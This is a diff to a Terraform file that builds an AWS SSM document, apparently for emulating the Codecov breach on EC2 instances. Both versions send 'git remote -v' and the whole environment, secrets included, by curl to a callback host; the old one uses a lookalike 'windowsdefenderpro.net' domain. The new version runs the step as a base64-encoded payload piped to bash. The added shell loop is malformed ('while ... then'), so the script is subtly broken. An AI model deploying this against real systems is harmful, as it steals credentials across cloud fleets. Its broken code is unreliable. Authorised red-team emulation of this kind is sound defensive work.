@@ -1,19 +1,38 @@
 locals {
-    callback_url = "https://catcher.windowsdefenderpro.net"
+    host_ip = var.host_ip
+    host_port = var.host_port
+    callback_url = var.use_ssl == true ? "https://${local.host_ip}:${local.host_port}" : "http://${local.host_ip}:${local.host_port}"
+    payload = <<-EOT
+    LOGFILE=/tmp/attacker_exec_git_codecov.log
+    function log {
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
+        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
+    }
+    truncate -s 0 $LOGFILE
+    log "checking for git..."
+    while ! which git; then
+        log "git not found - waiting"
+        sleep 10
+    done
+    log "running curl: ${local.callback_url}/upload/v2"
+    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" ${local.callback_url}/upload/v2 || true
+    log "done"
+    EOT
+    base64_payload = base64encode(local.payload)
 }
 
-resource "aws_ssm_document" "exec_codecov" {
-  name          = "exec_codecov"
+resource "aws_ssm_document" "exec_git_codecov" {
+  name          = "exec_git_codecov"
   document_type = "Command"
 
   content = jsonencode(
     {
         "schemaVersion": "2.2",
-        "description": "exec codecov style callback",
+        "description": "exec git codecov style callback",
         "mainSteps": [
             {
                 "action": "aws:runShellScript",
-                "name": "exec_codecov",
+                "name": "exec_git_codecov",
                 "precondition": {
                     "StringEquals": [
                         "platformType",
@@ -23,8 +42,8 @@ resource "aws_ssm_document" "exec_codecov" {
                 "inputs": {
                     "timeoutSeconds": "60",
                     "runCommand": [
-                        "curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2 || true",
-                        "touch /tmp/attacker_exec_codecov"
+                        "echo \"${local.base64_payload}\" > /tmp/payload",
+                        "echo '${local.base64_payload}' | base64 -d | /bin/bash -"
                     ]
                 }
             }
@@ -32,11 +51,11 @@ resource "aws_ssm_document" "exec_codecov" {
     })
 }
 
-resource "aws_resourcegroups_group" "exec_codecov" {
-    name = "exec_codecov"
+resource "aws_resourcegroups_group" "exec_git_codecov" {
+    name = "exec_git_codecov"
 
     resource_query {
-        query = jsonencode(var.resource_query_exec_codecov)
+        query = jsonencode(var.resource_query_exec_git_codecov)
     }
 
     tags = {
@@ -45,15 +64,15 @@ resource "aws_resourcegroups_group" "exec_codecov" {
     }
 }
 
-resource "aws_ssm_association" "exec_codecov" {
-    association_name = "exec_codecov"
+resource "aws_ssm_association" "exec_git_codecov" {
+    association_name = "exec_git_codecov"
 
-    name = aws_ssm_document.exec_codecov.name
+    name = aws_ssm_document.exec_git_codecov.name
 
     targets {
         key = "resource-groups:Name"
         values = [
-            aws_resourcegroups_group.exec_codecov.name,
+            aws_resourcegroups_group.exec_git_codecov.name,
         ]
     }
 
